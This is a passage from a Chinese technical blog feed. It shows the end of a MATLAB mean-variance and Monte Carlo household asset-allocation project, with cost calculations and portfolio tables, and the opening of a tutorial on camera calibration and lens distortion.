alt="image-20210601165353153"></p><h3 id="2-2-考虑交易成本的均值-方差模型-参考文献5-2-3"><a href="#2-2-考虑交易成本的均值-方差模型-参考文献5-2-3" class="headerlink" title="2.2 考虑交易成本的均值-方差模型-参考文献5.2.3"></a>2.2 考虑交易成本的均值-方差模型-参考文献5.2.3</h3><p>均值方差计算出四种风险理财交易成本，计算包括交易成本的投资收益率</p><h4 id="2-2-1-理财工具交易成本计算："><a href="#2-2-1-理财工具交易成本计算：" class="headerlink" title="2.2.1 理财工具交易成本计算："></a>2.2.1 理财工具交易成本计算：</h4><p>股票的交易成本：</p><p>截止2015年12月31日上海交易所A股挂牌数1073只，B股52只；深圳交易所A股467只，B股49只</p><p>上交所经手费：（0.00696%×1073+0.026%×52）÷（1073+52）=0.00784%</p><p>深交所经手费：（0.00696%×467+0.301%×49）÷（467+49）=0.03488%</p><p>股票交易的经手费：（0.00784%×1125+0.03488%×516）÷（1125+516）=0.01634%</p><p>股票交易的监管费：（0.002%×1125+0.02%×516）÷（1125+516）=0.00766%</p><p>股票交易的过户费：（0.6‰×1125+0）÷（1125+516）=0.04113%</p><p>股票交易佣金：成交额的2‰</p><p>因此</p><p>2005年-2006年股票交易成本为：（1‰+0.01634%+0.00766%+2‰+0.04113%）×2=0.73026%</p><p>2007年股票交易成本为：（3‰+0.01634%+0.00766%+2‰+0.04113%）×2=1.13026%</p><p>2008年-2015年股票交易成本为：1‰+（0.01634%+0.00766%+2‰+0.04113%）×2=0.63026%</p><p>债券的交易成本：0.25%</p><p>基金的交易成本：1.51%</p><p>房产的交易成本：3.5 %</p><h4 id="2-2-2-均值-方差模型改良版1（考虑交易成本）"><a href="#2-2-2-均值-方差模型改良版1（考虑交易成本）" class="headerlink" title="2.2.2 均值-方差模型改良版1（考虑交易成本）"></a>2.2.2 均值-方差模型改良版1（考虑交易成本）</h4><p>考虑交易成本的均值-方差模型计算出四种风险理财工具2006年至2015年的投资收益率，模型如下：</p><p>​                                </p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165520161.png" alt="image-20210601165520161"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165528375.png" alt="image-20210601165528375"></p><p>（注：上图第一行公式序号参考文献有误，应该是“将公式（5-5）带入（5-6）中”）</p><h4 id="2-2-3-运行fun5-2-3，模型计算得到结果"><a href="#2-2-3-运行fun5-2-3，模型计算得到结果" class="headerlink" title="2.2.3 运行fun5_2_3，模型计算得到结果"></a>2.2.3 运行fun5_2_3，模型计算得到结果</h4><p>运行MATLAB的fun5_2_3.m文件，得到如下结果</p><p>四种风险理财工具的投资收益率（含交易成本）</p><table><thead><tr><th>年度</th><th>股票投资收益率</th><th>债券投资收益率</th><th>基金投资收益率</th><th>房产投资收益率</th></tr></thead><tbody><tr><td>2007</td><td>92.26%</td><td>-0.47%</td><td>138.48%</td><td>7.00%</td></tr><tr><td>2008</td><td>-65.82%</td><td>9.90%</td><td>-50.38%</td><td>-8.31%</td></tr><tr><td>2009</td><td>77.73%</td><td>-0.36%</td><td>79.11%</td><td>14.86%</td></tr><tr><td>2010</td><td>-15.38%</td><td>1.45%</td><td>4.47%</td><td>0.23%</td></tr><tr><td>2011</td><td>-22.66%</td><td>4.58%</td><td>-25.27%</td><td>-0.38%</td></tr><tr><td>2012</td><td>1.88%</td><td>3.15%</td><td>4.70%</td><td>0.42%</td></tr><tr><td>2013</td><td>-7.92%</td><td>-0.79%</td><td>1.24%</td><td>0.42%</td></tr><tr><td>2014</td><td>50.96%</td><td>9.79%</td><td>28.90%</td><td>-5.48%</td></tr><tr><td>2015</td><td>-6.80%</td><td>7.64%</td><td>16.95%</td><td>0.15%</td></tr></tbody></table><p>MATLAB使用数据（忽略）</p><table><thead><tr><th>年度</th><th>股票投资收益率</th><th>债券投资收益率</th><th>基金投资收益率</th><th>房产投资收益率</th></tr></thead><tbody><tr><td>2007</td><td>0.9226</td><td>-0.0047</td><td>1.3848</td><td>0.0700</td></tr><tr><td>2008</td><td>-0.6582</td><td>0.0990</td><td>-0.5038</td><td>-0.0831</td></tr><tr><td>2009</td><td>0.7773</td><td>-0.0036</td><td>0.7911</td><td>0.1486</td></tr><tr><td>2010</td><td>-0.1538</td><td>0.0145</td><td>0.0447</td><td>0.0023</td></tr><tr><td>2011</td><td>-0.2266</td><td>0.0458</td><td>-0.2527</td><td>-0.0038</td></tr><tr><td>2012</td><td>0.0188</td><td>0.0315</td><td>0.0470</td><td>0.0042</td></tr><tr><td>2013</td><td>-0.0792</td><td>-0.0079</td><td>0.0124</td><td>0.0042</td></tr><tr><td>2014</td><td>0.5096</td><td>0.0979</td><td>0.2890</td><td>-0.0548</td></tr><tr><td>2015</td><td>-0.0680</td><td>0.0764</td><td>0.1695</td><td>0.0015</td></tr></tbody></table><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165727130.png" alt="image-20210601165727130"></p><h3 id="2-3-计算风险资产组合有效前沿-参考文献5-3"><a href="#2-3-计算风险资产组合有效前沿-参考文献5-3" class="headerlink" title="2.3 计算风险资产组合有效前沿-参考文献5-3"></a>2.3 计算风险资产组合有效前沿-参考文献5-3</h3><h4 id="2-3-1-SPSS求四种工具相关系数矩阵、期望投资收益率、标准差"><a href="#2-3-1-SPSS求四种工具相关系数矩阵、期望投资收益率、标准差" class="headerlink" title="2.3.1 SPSS求四种工具相关系数矩阵、期望投资收益率、标准差"></a>2.3.1 SPSS求四种工具相关系数矩阵、期望投资收益率、标准差</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165746905.png" alt="image-20210601165746905"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165853316.png" alt="image-20210601165853316"></p><p>计算结果整理如下参考文献表5-14</p><table><thead><tr><th>项目</th><th>股票</th><th>债券</th><th>基金</th><th>房产</th><th></th></tr></thead><tbody><tr><td>相关系数矩阵</td><td>股票</td><td>1</td><td>-0.445</td><td>0.941</td><td>0.712</td></tr><tr><td>债券</td><td>-0.445</td><td>1</td><td>-0.533</td><td>-0.764</td><td></td></tr><tr><td>基金</td><td>0.941</td><td>-0.533</td><td>1</td><td>0.735</td><td></td></tr><tr><td>房产</td><td>0.712</td><td>-0.764</td><td>0.735</td><td>1</td><td></td></tr><tr><td>期望收益率</td><td>11.58%</td><td>3.87%</td><td>22.02%</td><td>0.99%</td><td></td></tr><tr><td>标准差</td><td>51.40%</td><td>4.34%</td><td>56.36%</td><td>6.71%</td><td></td></tr></tbody></table><h4 id="2-3-2-运行fun5-3-2计算协方差，有效前沿"><a href="#2-3-2-运行fun5-3-2计算协方差，有效前沿" class="headerlink" title="2.3.2 运行fun5_3_2计算协方差，有效前沿"></a>2.3.2 运行fun5_3_2计算协方差，有效前沿</h4><p>根据上表数据，利用MATLAB金融工具箱计算出风险投资工具的协方差及风险资产组合的有效前沿，（参考文献表5-15）</p><p>SPSS计算的协方差</p><table><thead><tr><th>项目</th><th>股票</th><th>债券</th><th>基金</th><th>房产</th><th></th></tr></thead><tbody><tr><td>协方差</td><td>股票</td><td>0.264</td><td>-0.01</td><td>0.273</td><td>0.025</td></tr><tr><td>债券</td><td>-0.01</td><td>0.002</td><td>-0.013</td><td>-0.002</td><td></td></tr><tr><td>基金</td><td>0.273</td><td>-0.013</td><td>0.318</td><td>0.028</td><td></td></tr><tr><td>房产</td><td>0.025</td><td>-0.002</td><td>0.028</td><td>0.005</td><td></td></tr></tbody></table><p>用MATLAB同样可以计算出这里的协方差，运行fun5_3.m文件得到如下结果</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165954725.png" alt="image-20210601165954725"></p><h4 id="2-3-3-根据协方差结果计算20种最优组合"><a href="#2-3-3-根据协方差结果计算20种最优组合" class="headerlink" title="2.3.3 根据协方差结果计算20种最优组合"></a>2.3.3 根据协方差结果计算20种最优组合</h4><p>根据协方差结果进一步计算20种最优组合，20种最优组合 ，绘制期望收益率与标准差</p><table><thead><tr><th>投资组合</th><th>期望收益率</th><th>标准差</th><th>权重</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>股票</td><td>债券</td><td>基金</td><td>房产</td><td></td><td></td><td></td></tr><tr><td>1</td><td>2.82%</td><td>2.34%</td><td>0%</td><td>63.64%</td><td>0%</td><td>36.36%</td></tr><tr><td>2</td><td>3.83%</td><td>2.81%</td><td>0%</td><td>77.76%</td><td>2.87%</td><td>19.37%</td></tr><tr><td>3</td><td>4.84%</td><td>3.68%</td><td>0%</td><td>91.15%</td><td>5.84%</td><td>3.01%</td></tr><tr><td>4</td><td>5.85%</td><td>5.34%</td><td>0%</td><td>89.07%</td><td>10.93%</td><td>0%</td></tr><tr><td>5</td><td>6.86%</td><td>8.04%</td><td>0%</td><td>83.50%</td><td>16.50%</td><td>0%</td></tr><tr><td>6</td><td>7.87%</td><td>11.06%</td><td>0%</td><td>77.94%</td><td>22.06%</td><td>0%</td></tr><tr><td>7</td><td>8.89%</td><td>14.19%</td><td>0%</td><td>72.37%</td><td>27.63%</td><td>0%</td></tr><tr><td>8</td><td>9.90%</td><td>17.37%</td><td>0%</td><td>66.80%</td><td>33.20%</td><td>0%</td></tr><tr><td>9</td><td>10.91%</td><td>20.58%</td><td>0%</td><td>61.24%</td><td>38.76%</td><td>0%</td></tr><tr><td>10</td><td>11.92%</td><td>23.81%</td><td>0%</td><td>55.67%</td><td>44.33%</td><td>0%</td></tr><tr><td>11</td><td>12.93%</td><td>27.05%</td><td>0%</td><td>50.10%</td><td>49.90%</td><td>0%</td></tr><tr><td>12</td><td>13.94%</td><td>30.30%</td><td>0%</td><td>44.53%</td><td>55.47%</td><td>0%</td></tr><tr><td>13</td><td>14.95%</td><td>33.55%</td><td>0%</td><td>38.97%</td><td>61.03%</td><td>0%</td></tr><tr><td>14</td><td>15.96%</td><td>36.81%</td><td>0%</td><td>33.40%</td><td>66.60%</td><td>0%</td></tr><tr><td>15</td><td>16.97%</td><td>40.07%</td><td>0%</td><td>27.83%</td><td>72.17%</td><td>0%</td></tr><tr><td>16</td><td>17.98%</td><td>43.33%</td><td>0%</td><td>22.27%</td><td>77.73%</td><td>0%</td></tr><tr><td>17</td><td>18.99%</td><td>46.59%</td><td>0%</td><td>16.70%</td><td>83.30%</td><td>0%</td></tr><tr><td>18</td><td>20.00%</td><td>49.86%</td><td>0%</td><td>11.13%</td><td>88.87%</td><td>0%</td></tr><tr><td>19</td><td>21.01%</td><td>53.12%</td><td>0%</td><td>5.57%</td><td>94.43%</td><td>0%</td></tr><tr><td>20</td><td>22.02%</td><td>56.39%</td><td>0%</td><td>0%</td><td>100.00%</td><td>0%</td></tr></tbody></table><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170032011.png" alt="image-20210601170032011"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170045184.png" alt="image-20210601170045184"></p><p>MATLAB使用数据（可忽略）</p><table><thead><tr><th>投资组合</th><th>期望收益率</th><th>标准差</th><th>权重</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>股票</td><td>债券</td><td>基金</td><td>房产</td><td></td><td></td><td></td></tr><tr><td>1</td><td>0.0282</td><td>0.0234</td><td>0</td><td>0.6364</td><td>0</td><td>0.3636</td></tr><tr><td>2</td><td>0.0383</td><td>0.0281</td><td>0</td><td>0.7776</td><td>0.0287</td><td>0.1937</td></tr><tr><td>3</td><td>0.0484</td><td>0.0368</td><td>0</td><td>0.9115</td><td>0.0584</td><td>0.0301</td></tr><tr><td>4</td><td>0.0585</td><td>0.0534</td><td>0</td><td>0.8907</td><td>0.1093</td><td>0</td></tr><tr><td>5</td><td>0.0686</td><td>0.0804</td><td>0</td><td>0.8350</td><td>0.1650</td><td>0</td></tr><tr><td>6</td><td>0.0787</td><td>0.1106</td><td>0</td><td>0.7794</td><td>0.2206</td><td>0</td></tr><tr><td>7</td><td>0.0889</td><td>0.1419</td><td>0</td><td>0.7237</td><td>0.2763</td><td>0</td></tr><tr><td>8</td><td>0.0990</td><td>0.1737</td><td>0</td><td>0.6680</td><td>0.3320</td><td>0</td></tr><tr><td>9</td><td>0.1091</td><td>0.2058</td><td>0</td><td>0.6124</td><td>0.3876</td><td>0</td></tr><tr><td>10</td><td>0.1192</td><td>0.2381</td><td>0</td><td>0.5567</td><td>0.4433</td><td>0</td></tr><tr><td>11</td><td>0.1293</td><td>0.2705</td><td>0</td><td>0.5010</td><td>0.4990</td><td>0</td></tr><tr><td>12</td><td>0.1394</td><td>0.3030</td><td>0</td><td>0.4453</td><td>0.5547</td><td>0</td></tr><tr><td>13</td><td>0.1495</td><td>0.3355</td><td>0</td><td>0.3897</td><td>0.6103</td><td>0</td></tr><tr><td>14</td><td>0.1596</td><td>0.3681</td><td>0</td><td>0.3340</td><td>0.6660</td><td>0</td></tr><tr><td>15</td><td>0.1697</td><td>0.4007</td><td>0</td><td>0.2783</td><td>0.7217</td><td>0</td></tr><tr><td>16</td><td>0.1798</td><td>0.4333</td><td>0</td><td>0.2227</td><td>0.7773</td><td>0</td></tr><tr><td>17</td><td>0.1899</td><td>0.4659</td><td>0</td><td>0.1670</td><td>0.8330</td><td>0</td></tr><tr><td>18</td><td>0.2000</td><td>0.4986</td><td>0</td><td>0.1113</td><td>0.8887</td><td>0</td></tr><tr><td>19</td><td>0.2101</td><td>0.5312</td><td>0</td><td>0.0557</td><td>0.9443</td><td>0</td></tr><tr><td>20</td><td>0.2202</td><td>0.5639</td><td>0</td><td>0</td><td>1.0000</td><td>0</td></tr></tbody></table><h3 id="2-4-考虑无风险资产后的均值-方差模型"><a href="#2-4-考虑无风险资产后的均值-方差模型" class="headerlink" title="2.4 考虑无风险资产后的均值-方差模型"></a>2.4 考虑无风险资产后的均值-方差模型</h3><p>考虑无风险资产，本质上是添加了风险厌恶系数，厌恶系数越高，越偏向于无风险，本文数据中只有银行存款属于无风险收益，故后文的无风险利率就是银行利率。</p><p>​    运行fun5_4.m文件，实现模型算法，得到以下结果：</p><h4 id="2-4-1-运行fun5-4-m得到20种引入无风险资产后的配置"><a href="#2-4-1-运行fun5-4-m得到20种引入无风险资产后的配置" class="headerlink" title="2.4.1 运行fun5_4.m得到20种引入无风险资产后的配置"></a>2.4.1 运行fun5_4.m得到20种引入无风险资产后的配置</h4><p>引入无风险资产后的资产配置</p><table><thead><tr><th>风险厌恶系数</th><th>资产组合期望收益</th><th>资产组合标准差</th><th>风险资产权重</th></tr></thead><tbody><tr><td>15</td><td>0.0491</td><td>0.0351</td><td>72.70%</td></tr><tr><td>20</td><td>0.0445</td><td>0.0263</td><td>54.53%</td></tr><tr><td>25</td><td>0.0417</td><td>0.0211</td><td>43.62%</td></tr><tr><td>30</td><td>0.0398</td><td>0.0176</td><td>36.35%</td></tr><tr><td>35</td><td>0.0385</td><td>0.0150</td><td>31.16%</td></tr><tr><td>40</td><td>0.0375</td><td>0.0132</td><td>27.26%</td></tr><tr><td>45</td><td>0.0368</td><td>0.0117</td><td>24.23%</td></tr><tr><td>50</td><td>0.0361</td><td>0.0105</td><td>21.81%</td></tr><tr><td>55</td><td>0.0356</td><td>0.0096</td><td>19.83%</td></tr><tr><td>60</td><td>0.0352</td><td>0.0088</td><td>18.18%</td></tr><tr><td>65</td><td>0.0349</td><td>0.0081</td><td>16.78%</td></tr><tr><td>70</td><td>0.0346</td><td>0.0075</td><td>15.58%</td></tr><tr><td>75</td><td>0.0343</td><td>0.0070</td><td>14.54%</td></tr><tr><td>80</td><td>0.0341</td><td>0.0066</td><td>13.63%</td></tr><tr><td>85</td><td>0.0339</td><td>0.0062</td><td>12.83%</td></tr><tr><td>90</td><td>0.0337</td><td>0.0059</td><td>12.12%</td></tr><tr><td>95</td><td>0.0335</td><td>0.0055</td><td>11.48%</td></tr><tr><td>100</td><td>0.0334</td><td>0.0053</td><td>10.91%</td></tr><tr><td>105</td><td>0.0332</td><td>0.0050</td><td>10.39%</td></tr><tr><td>110</td><td>0.0331</td><td>0.0048</td><td>9.91%</td></tr></tbody></table><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170101797.png" alt="image-20210601170101797"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170122054.png" alt="image-20210601170122054"></p><p>附，fun5_4.m中的一点说明</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170142355.png" alt="image-20210601170142355"></p><h3 id="2-5-城镇家庭资产配置的最优组合"><a href="#2-5-城镇家庭资产配置的最优组合" class="headerlink" title="2.5 城镇家庭资产配置的最优组合"></a>2.5 城镇家庭资产配置的最优组合</h3><p>对于风险系数的讨论具体参照参考文献5.5部分，这里根据问卷调查结果得到风险厌恶系数最大，平均和最小值，代入均值-方差模型计算得到如下资产分布配置表：</p><h4 id="2-5-1-运行fun5-5-m得到3种风险厌恶系数的资产配置结果"><a href="#2-5-1-运行fun5-5-m得到3种风险厌恶系数的资产配置结果" class="headerlink" title="2.5.1 运行fun5_5.m得到3种风险厌恶系数的资产配置结果"></a>2.5.1 运行fun5_5.m得到3种风险厌恶系数的资产配置结果</h4><table><thead><tr><th>风险厌恶系数</th><th>资产组合收益率</th><th>资产组合标准差</th><th>银行存款</th><th>股票</th><th>债券</th><th>基金</th><th>房产</th></tr></thead><tbody><tr><td>52.8</td><td>3.59%</td><td>1.00%</td><td>79.35%</td><td>0.00%</td><td>18.50%</td><td>2.00%</td><td>0.15%</td></tr><tr><td>39.8</td><td>3.76%</td><td>1.32%</td><td>72.60%</td><td>0.00%</td><td>24.55%</td><td>2.65%</td><td>0.20%</td></tr><tr><td>17.6</td><td>4.64%</td><td>2.99%</td><td>38.04%</td><td>0.00%</td><td>55.51%</td><td>5.99%</td><td>0.46%</td></tr></tbody></table><h3 id="2-6-家庭资产配置最优组合蒙特卡洛仿真模拟-对应参考文献5-5-2"><a href="#2-6-家庭资产配置最优组合蒙特卡洛仿真模拟-对应参考文献5-5-2" class="headerlink" title="2.6 家庭资产配置最优组合蒙特卡洛仿真模拟-对应参考文献5.5.2"></a>2.6 家庭资产配置最优组合蒙特卡洛仿真模拟-对应参考文献5.5.2</h3><p>运行gui.m进行蒙特卡洛仿真模拟，蒙特卡洛仿真模拟结果：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170213698.png" alt="image-20210601170213698"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170232842.png" alt="image-20210601170232842"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170252577.png" alt="image-20210601170252577"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170329848.png" alt="image-20210601170329848"></p><p>上4张图是在风险厌恶系数为39.8(即受调查者的风险厌恶系数均值)的情况下，蒙特卡洛模拟的家庭各资产配置比例的频率图，下面两个图是上述模拟的投资组合的收益率和风险的频率图。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170342896.png" alt="image-20210601170342896"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601170401908.png" alt="image-20210601170401908"></p><p>当各投资工具呈上述波动时，模拟10000次的结果显示:城镇家庭不适合持有股票，持有债券的比例在30%附近进行调整，持有基金的比例在3%附近进行调整，一般也不适合投资房产，如果资金充裕的话，可以进行适度投资，但不应该超过5%。</p><p>风险与收益率的两张图表明:在存在上述波动时，城镇家庭资产组合的收益率会在3.2%-6%之间波动，在3.5%附近的可能性较大;投资组合的风险会在0.5%-3%之间波动，在1.3%附近的可能性较大。家庭资产配置是个复杂而漫长的动态过程，投资工具的收益率也不是固定不变的。</p><p>此外还存在许多不确定因素，因此，家庭资产配置的决策者需要不断对家庭资产配置组合进行调整，从而实现自身效用的最大化。</p><hr><h2 id="项目交差"><a href="#项目交差" class="headerlink" title="项目交差"></a>项目交差</h2><p><video style="width:700px" src=https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/matlab_%E9%87%91%E8%9E%8D%E9%A2%84%E6%B5%8B-%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B_batch.mp4></video></p><hr><h2 id="说点别的"><a href="#说点别的" class="headerlink" title="说点别的"></a>说点别的</h2><p>这份工作已经上传到github上了，遵循GPL协议，拥抱开源。由于这篇文章是后面才补的，做项目时还没有博客，也比较仓促，所以只记录了关键部分，细节可能有不到位的地方，但是整体是通顺的，仅作为个人记录与学习交流使用。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601194842948.png" alt="image-20210601194842948"></p>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Matlab </tag>
            
            <tag> 蒙特卡洛 </tag>
            
            <tag> 马科维茨 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单视图几何-相机标定</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%8D%95%E8%A7%86%E5%9B%BE%E5%87%A0%E4%BD%95-%E7%9B%B8%E6%9C%BA%E6%A0%87%E5%AE%9A/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%8D%95%E8%A7%86%E5%9B%BE%E5%87%A0%E4%BD%95-%E7%9B%B8%E6%9C%BA%E6%A0%87%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="单视图几何——相机标定（camera-calibration）"><a href="#单视图几何——相机标定（camera-calibration）" class="headerlink" title="单视图几何——相机标定（camera calibration）"></a>单视图几何——相机标定（camera calibration）</h2><h3 id="1-四个坐标系"><a href="#1-四个坐标系" class="headerlink" title="1.四个坐标系"></a>1.四个坐标系</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200906195118130.png" alt="image-20200906195118130"></p><ul><li>世界坐标系</li><li>相机坐标系</li><li>图像坐标系</li><li>像素坐标系</li></ul><h3 id="2-坐标系的变换与参数矩阵"><a href="#2-坐标系的变换与参数矩阵" class="headerlink" title="2.坐标系的变换与参数矩阵"></a>2.坐标系的变换与参数矩阵</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200909133937601.png" alt="image-20200909133937601"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200909134016813.png"></p><h4 id="2-1-内参矩阵"><a href="#2-1-内参矩阵" class="headerlink" title="2.1.内参矩阵"></a>2.1.内参矩阵</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910105440657.png" alt="image-20200910105440657"></p><h4 id="2-2-外参矩阵"><a href="#2-2-外参矩阵" class="headerlink" title="2.2.外参矩阵"></a>2.2.外参矩阵</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910105422749.png" alt="image-20200910105422749"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200909145615395.png" alt="image-20200909145615395"></p><p><strong>相机标定的第一个目的就是先求出内参矩阵和外参矩阵</strong></p><h3 id="3-畸变"><a href="#3-畸变" class="headerlink" title="3.畸变"></a>3.畸变</h3><h4 id="3-1-畸变是什么？"><a href="#3-1-畸变是什么？" class="headerlink" title="3.1.畸变是什么？"></a>3.1.畸变是什么？</h4><p>顾名思义，畸变就是实际眼睛看到的图像与利用光学系统看到的（拍摄到的）图像出现的一些畸形变化的现象。</p><h5 id="3-1-1-畸变有哪些种类？"><a href="#3-1-1-畸变有哪些种类？" class="headerlink" title="3.1.1.畸变有哪些种类？"></a>3.1.1.畸变有哪些种类？</h5><ul><li><p>径向畸变与切向畸变</p><p>一般来说，畸变可以分为<strong>径向畸变和切向畸变</strong>。</p><ul><li><p>径向畸变</p><p>顾名思义，径向畸变就是沿着透镜半径方向分布的畸变，产生原因是光线在原理透镜中心的地方比靠近中心的地方更加弯曲，这种畸变在普通廉价的镜头中表现更加明显，径向畸变主要包括桶形畸变和枕形畸变两种。</p></li><li><p>切向畸变</p><p>切向畸变是由于透镜本身与相机传感器平面（成像平面）或图像平面不平行而产生的，这种情况多是由于透镜被粘贴到镜头模组上的安装偏差导致。</p></li></ul></li><li><p>根据视觉感知，畸变实际上也可以分为3类：</p></li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910095315023.png" alt="image-20200910095315023"></p><h5 id="3-1-2-枕形畸变与桶形畸变"><a href="#3-1-2-枕形畸变与桶形畸变" class="headerlink" title="3.1.2.枕形畸变与桶形畸变"></a>3.1.2.枕形畸变与桶形畸变</h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910085537358.png" alt="image-20200910085537358"></p><h5 id="3-1-3-线性畸变："><a href="#3-1-3-线性畸变：" class="headerlink" title="3.1.3.线性畸变："></a>3.1.3.线性畸变：</h5><p>镜头畸变的另外一种表现形式是线性畸变，就是当我们试图近距离拍摄一些笔直高大的建筑的时候，实际上平行的线条显得并不平行了，边线弯了，很别扭，这种我们叫它<strong>线性畸变</strong>。</p><p>当试图近距离拍摄高大的直线结构，比如建筑物或树木的时候,就会导致另外一种失真。假设使用的是广角镜头，并且认为只把照相机稍微向上瞄准一点，就可以离得很近也能把整个结构拍摄下来。但是由于实际上平行的线条显得并不平行了，结果是建筑物或树木好像要倾倒下来似的，这种失真现象被称为线性畸变。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910110354437.png" alt="image-20200910110354437"></p><h4 id="3-2-为什么会产生畸变？"><a href="#3-2-为什么会产生畸变？" class="headerlink" title="3.2.为什么会产生畸变？"></a>3.2.为什么会产生畸变？</h4><h5 id="3-2-1-对于径向畸变"><a href="#3-2-1-对于径向畸变" class="headerlink" title="3.2.1.对于径向畸变"></a>3.2.1.对于径向畸变</h5><p>这些畸变是由<strong>镜头镜片系统的放大率差异</strong>导致的，根本原因与制造工艺，透镜材料等透镜的固有属性有关。</p><p>注：凸透镜放大率计算公式：<strong>K=f/(f-u)<strong>，其中K为放大系数，f为透镜焦距，u为物距（物体与透镜的距离）。对于</strong>理想光学系统</strong>，在一对共轭的物像平面上，<strong>放大率是常数</strong>。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910094114627.png" alt="image-20200910094114627"></p><p>但是实际使用中的光学系统，几乎很难做到理想状态那样，因为<strong>透镜的放大率随光束和主轴间所成角度改变而改变（有时候叫视场角）</strong>。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910094405947.png" alt="image-20200910094405947"></p><p>特别是镜片屈光度大的时候，这种畸变现象就比较严重。像这样的畸变是跟镜头固有特性有关（凸透镜汇聚光线、凹透镜发散光线）的，是<strong>无法完全消除的</strong>，只能改善，任何一只镜头从工厂出厂后，它的畸变率就固定下来。通常来说我们相机镜头的畸变率一般都是控制在百分之零点几这样。</p><p>我们需要记住的是<strong>桶形畸变一般是由广角镜头产生的，而枕形畸变一般是因为长焦镜头产生的。</strong></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910095154109.png" alt="image-20200910095154109"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910095209586.png" alt="image-20200910095209586"></p><p>这类的镜头畸变只和镜头焦距有关，和其他因素都没有关系。</p><h5 id="3-2-2-对于线性畸变"><a href="#3-2-2-对于线性畸变" class="headerlink" title="3.2.2.对于线性畸变"></a>3.2.2.对于线性畸变</h5><p>问题出自于向上倾斜了照相机，镜头所瞄准的的方向导致建筑物或树木的两侧充当了像典型铁路轨道一样的角色，即它们朝向中心汇聚并产生了正常的<strong>纵深透视</strong>。</p><p>如果摄影者是站在建筑物一面墙或树木的一侧中部的静点位置拍摄，那么上述这种透视关系看去并非不自然。但是，当摄影者的位置偏离中心时，由于结构的两侧并不是以相同的角度汇聚，问题就出现了。比如，有这么一面建筑物的墙，它的一个边看上去直上直下的，而另外一个边呈30°角，这样拍出来的照片似乎是金字塔而决非是什么摩天大楼。</p><p>这种问题不仅仅是出现在广角镜头上，如果拍摄角度相同，任何一只镜头都会产生线性畸变。只是由于广角镜头使得线条的倾侧更明显，让这一现象更为显著罢了。怎样解决这种问题呢？</p><ul><li><p>其实很简单，只需要使照相机背部与所拍摄的建筑物正面平行即可。如果拍摄不到整个建筑物的话，要么换用更广角的镜头，要么向后移动。</p></li><li><p>另外一个线性畸变问题的解决方案是使用机背取景照相机。这种照相机可以上下或左右移动镜头，从而使所拍摄物体的正面与位于固定位置的胶片保持平行。</p></li></ul><h4 id="3-3-如何改善畸变"><a href="#3-3-如何改善畸变" class="headerlink" title="3.3.如何改善畸变"></a>3.3.如何改善畸变</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910095434351.png" alt="image-20200910095434351"></p><p>附：VR透镜畸变的三种解决方案 <a href="https://www.jianshu.com/p/812217848769">https://www.jianshu.com/p/812217848769</a></p><h3 id="4-畸变矫正"><a href="#4-畸变矫正" class="headerlink" title="4.畸变矫正"></a>4.畸变矫正</h3><h4 id="4-0-径向畸变与切向畸变"><a href="#4-0-径向畸变与切向畸变" 